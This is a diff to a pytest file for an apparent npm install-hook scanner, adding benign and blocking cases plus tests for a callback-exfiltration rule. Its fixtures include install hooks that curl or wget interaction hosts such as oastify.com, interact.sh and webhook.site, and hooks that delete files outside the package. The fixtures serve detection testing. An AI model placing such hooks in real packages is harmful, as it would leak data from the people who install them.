@@ -55,6 +55,11 @@ class TestBuildStepsAreNotBlocked:
             ({"postinstall": "cd client && npm install && cd .."}, None),
             ({"install": "(cd node_modules/theme && npm install)"}, None),
             ({"postinstall": "chmod u+x ffmpeg"}, None),
+            # `chmod +x` on the package's own file (note 71 I1: auto-dep-install, bun-serve).
+            ({"postinstall": "chmod +x index.js"}, None),
+            ({"postinstall": "chmod +x bin/cli.js lib/run.sh"}, None),
+            # A pinned install of a declared dependency at its declared version (note 71 I2).
+            ({"postinstall": "npm install toastr@2.1.4"}, {"toastr": "^2.1.4"}),
             ({"postinstall": "touch ./node_modules/marker"}, None),
             ({"postinstall": "rm -rf dist/"}, None),
             ({"postinstall": "cat index.json"}, None),
@@ -62,6 +67,21 @@ class TestBuildStepsAreNotBlocked:
         ],
     )
     def test_nothing_blocks(self, tmp_path: Path, scripts: dict, deps: dict | None) -> None:
+        found = HookKit.findings(tmp_path, scripts, deps)
+        assert all(f.severity < Severity.HIGH for f in found), [f.severity for f in found]
+
+    @pytest.mark.parametrize(
+        ("scripts", "deps"),
+        [
+            ({"postinstall": "npm install toastr@2.1.4"}, {"toastr": "^2.1.4"}),
+            ({"postinstall": "chmod +x index.js"}, None),
+        ],
+    )
+    def test_the_rule_itself_does_not_grade_it_high(
+        self, tmp_path: Path, scripts: dict, deps: dict | None, verdict_off: None
+    ) -> None:
+        # The rule's own grade: with the verdict on, this minimal fixture is held as a warning
+        # whatever the rule says, so only this form can fail (note 71 I1, I2).
         found = HookKit.findings(tmp_path, scripts, deps)
         assert all(f.severity < Severity.HIGH for f in found), [f.severity for f in found]
 
@@ -82,11 +102,17 @@ STILL_BLOCKS = [
     # A popular tool not declared at all: whatever is on PATH under that name runs.
     ({"postinstall": "webpack"}, None),
     # A popular tool whose output leaves the package.
-    ({"postinstall": "gulp > ~/.profile"}, {"gulp": "^4.0.0"}),
+    ({"postinstall": "gulp > /tmp/gulp.log"}, {"gulp": "^4.0.0"}),
     # Installing a named package is not the package's own install.
     ({"preinstall": "npm install some-helper"}, None),
+    # Pinned, but undeclared, at another version, or beside an undeclared one: a hidden dependency.
+    ({"postinstall": "npm install toastr@2.1.4"}, None),
+    ({"postinstall": "npm install toastr@2.1.5"}, {"toastr": "^2.1.4"}),
+    ({"postinstall": "npm install toastr@2.1.4 helper@1.0.0"}, {"toastr": "^2.1.4"}),
     # A file made inside the package, then run.
     ({"postinstall": "chmod u+x tool && ./tool"}, None),
+    ({"postinstall": "chmod +x ./bin/x && ./bin/x"}, None),
+    ({"postinstall": "chmod +x /usr/local/bin/x"}, None),
     # A file operation outside it.
     ({"postinstall": "touch ~/.marker"}, None),
     ({"postinstall": "rm -rf ../../src"}, None),
@@ -94,9 +120,10 @@ STILL_BLOCKS = [
 ]
 """Hook shapes the rule grades HIGH; `TestWhatStillBlocks` asserts the rule's grade and the user's."""
 
-HELD_BY_THE_VERDICT = {0}
+HELD_BY_THE_VERDICT = {0, 8, 9}
 """Cases the package verdict holds as a warning on this minimal fixture (measured 2 Nov, verdict on): a
-declared, non-established dependency's command. Marked strict, so a change that lifts it fails here
+declared, non-established dependency's command, and a pinned install beside a declared dependency (at
+another version, or with an undeclared package too; the undeclared pin alone, 7, blocks). Marked strict, so a change that lifts it fails here
 and the mark comes off (cordon-47: tests assert what the user sees)."""
 
 
@@ -178,3 +205,46 @@ class TestNetworkToolsInAnInstallHook:
     def test_does_not_fire(self, tmp_path: Path, scripts: dict) -> None:
         result = self.scan(tmp_path, scripts)
         assert not [f for f in result.findings if f.rule_id == self.PROBE]
+
+
+class TestAnInteractionHostInAScript:
+    """MALWARE.EXFIL.SCRIPT_CALLBACK.001: a script of the package's own package.json names an
+    interaction host (Destinations' list). 8 content misses in 4 groups, 0 benign newly blocked, on the
+    root manifest of every npm unit of rows a3b9c5f1 (scratchpad jsm/pairn-hosts.txt; 6 in 2 groups
+    in an install hook, the part that blocks). Graded with
+    the verdict on, as a user sees it; the fixtures are strings nothing runs."""
+
+    RULE = "MALWARE.EXFIL.SCRIPT_CALLBACK.001"
+
+    @pytest.mark.parametrize(
+        "scripts",
+        [
+            {"postinstall": "curl https://probe.oastify.com/x"},
+            {"preinstall": "wget -q http://a.b.interact.sh"},
+            {"install": "node t.js && curl webhook.site/abc"},
+        ],
+    )
+    def test_blocks_with_the_verdict_on(self, tmp_path: Path, scripts: dict) -> None:
+        result = TestNetworkToolsInAnInstallHook.scan(tmp_path, scripts)
+        found = [f for f in result.findings if f.rule_id == self.RULE]
+        assert len(found) == 1 and found[0].severity >= Severity.HIGH
+
+    def test_a_script_a_person_runs_is_reported_below_the_gate(self, tmp_path: Path) -> None:
+        # Repository grading option A: what a person runs warns; what installing runs blocks.
+        result = TestNetworkToolsInAnInstallHook.scan(
+            tmp_path, {"test": "node t.js && curl webhook.site/abc"}
+        )
+        found = [f for f in result.findings if f.rule_id == self.RULE]
+        assert len(found) == 1 and found[0].severity < Severity.HIGH
+
+    @pytest.mark.parametrize(
+        "scripts",
+        [
+            {"postinstall": "curl https://example.com/x"},
+            {"postinstall": "node install.js --registry https://oastify.com.example.net"},
+            {"docs": "echo see the guide"},
+        ],
+    )
+    def test_does_not_fire(self, tmp_path: Path, scripts: dict) -> None:
+        result = TestNetworkToolsInAnInstallHook.scan(tmp_path, scripts)
+        assert not [f for f in result.findings if f.rule_id == self.RULE]
